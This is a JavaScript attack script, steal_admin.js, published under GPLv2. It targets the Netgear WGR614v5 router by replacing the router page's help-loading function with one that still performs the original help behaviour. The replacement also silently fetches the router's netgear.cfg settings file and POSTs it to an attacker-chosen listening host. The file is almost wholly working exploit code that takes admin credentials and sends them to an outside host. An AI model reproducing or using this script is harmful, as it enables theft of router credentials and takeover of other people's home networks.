// steal_admin.js: Steal admin credentials on the wgr614v5
// Copyright (C) 2011 Simon Weber <sweb090@gmail.com>
// Code published under GPLv2; see LICENSE file

function loadhelp2(fname, anchname, args){
    steal_settings(args[0], args[1]);

    //The original loadhelp code.
    if ((loadhelp.arguments.length == 1 ) || (anchname == "" ))
	top.helpframe.location.href=fname+"_h.htm";
    else
	top.helpframe.location.href=fname+"_h.htm#" + anchname;
}

//Get the settings file and POST to the listen_url (doesn't include http://)
function steal_settings(router_ip, listen_url){
    var settings_file = http_get("http://" + router_ip + "/netgear.cfg");
    http_post("http://" + listen_url, "netgear.cfg", escape(settings_file));
}


//Urls assume http:// in parameters:

//Send a single (name, value) over POST
function http_post(url, name, data){
    var params = name + "=" + data;
  
    var http = new XMLHttpRequest();
    http.open("POST", url, true);

    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
  
    http.send(params);
}

function http_get(url){
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}